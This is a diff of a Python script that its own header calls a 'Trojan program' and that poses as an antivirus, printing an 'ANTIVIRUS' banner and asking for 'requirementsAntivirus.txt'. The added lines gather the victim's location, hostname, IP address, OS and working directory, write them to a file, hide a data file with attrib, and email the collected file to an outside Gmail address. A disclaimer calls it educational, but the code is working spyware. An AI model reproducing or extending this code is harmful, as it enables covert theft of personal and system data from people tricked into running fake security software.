@@ -1,7 +1,8 @@
 """
 Author: @new92
-This program has been made only for educational purposes and under no circumstances can or will be used for illegal activities
-For any illegal activities carried out using this tool the author has no responsibility
+Trojan program
+Made for educational purposes 
+The author has no responsibility for any illegal activity/activities carried out using this tool
           d8888                   888      d8b
          d88888                   888      Y8P
         d88P888                   888
@@ -25,22 +26,25 @@ try:
     import pyfiglet
     import geocoder
     import requests
+    import http
     import scapy
     import subprocess
     import smtplib
     import json 
     import getpass
     import cryptography
+    import crypto
     import sniffer
+    import gmail
     from geopy.geocoders import Nominatim
 except ImportError as imp:
     print("Error ! Make sure you have installed all the modules used in this program !")
     time.sleep(1)
-    print("Please enter the command: pip3 install -r requirements.txt")
-    time.sleep(1)
-    print("And execute again the program")
-    time.sleep(1)
-    print(imp)
+    print("Please enter the command: pip3 install -r requirementsAntivirus.txt")
+    time.sleep(2)
+    print("And execute the program again !")
+    time.sleep(2)
+    quit(0)
 #End of Imports
 
 #Main program
@@ -55,7 +59,8 @@ OS=platform.system()
 CWD=os.getcwd()
 language=locale.getdefaultlocale()
 SysFileEnc=sys.getfilesystemencoding()
-Data=location,hostname,DevIP,IPport,OSname,OS,CWD,language,SysFileEnc
+IPv6=socket.has_ipv6
+Data="Location: ",location,"Hostname: ",hostname,"Device IP: ",DevIP,"IP Port: ",IPport,"OS Name: ",OSname,"OS: ",OS,"Current Working Directory: ",CWD,"Language: ",language,"System File Encoding: ",SysFileEnc,"Has IPv6: ",IPv6
 f = open("AllData.txt","a")
 f.write(str(Data)+"\n")
 f.close()
@@ -76,7 +81,9 @@ file=open("Data.html","w")
 file.write(text)
 file.close()
 os.system("attrib +H Data.html")
-
+gmail1 = gmail.GMail("youremail@gmail.com","yourpassword")
+message = gmail.Message("Data",to="receiver@gmail.com",attachments=["AllData.txt"])
+gmail1.send(message)
 num=random.randint(1,24)
 antivirus=pyfiglet.figlet_format("ANTIVIRUS")
 print(antivirus)
